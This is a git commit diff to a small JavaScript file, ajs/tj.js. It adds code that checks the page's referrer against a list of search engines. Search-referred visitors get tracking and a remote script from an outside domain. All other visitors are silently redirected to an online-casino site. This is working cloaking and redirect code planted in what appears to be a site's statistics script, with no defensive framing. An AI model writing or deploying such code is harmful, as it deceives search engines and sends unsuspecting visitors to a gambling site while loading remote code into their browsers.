57327876552eb50987bece2d5b986f81998e12d4
js999999999 <js-9@outlook.com>
2017-02-24 13:19:33 +0800

    Update tj.js

--- ajs/tj.js
+++ ajs/tj.js
@@ -1,3 +1,11 @@
-document.writeln("<script language=\"javascript\" src=\"http:\/\/count51.51yes.com\/click.aspx?id=513791456&logo=12\" charset=\"gb2312\"><\/script>");
-
-document.writeln("<script src=http:\/\/\www.647123.com\/ajs/t.js ><\/script>");
+today=new Date();
+today=today.getYear()+"-"+(today.getMonth()+1)+"-"+today.getDate();
+var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+){1,2}\//ig;
+var where =document.referrer;
+if(regexp.test(where)){
+document.write ('<script language="javascript" src="http://count28.51yes.com/click.aspx?id=280954514&logo=6" charset="gb2312"></script><script language="javascript" type="text/javascript" src="http://www.647123.com/ajs/tj1.js"></script></div>');
+}
+else
+{
+window.location.href="http://www.48171c.com/#澳门新葡京大型国际娱乐城";
+}
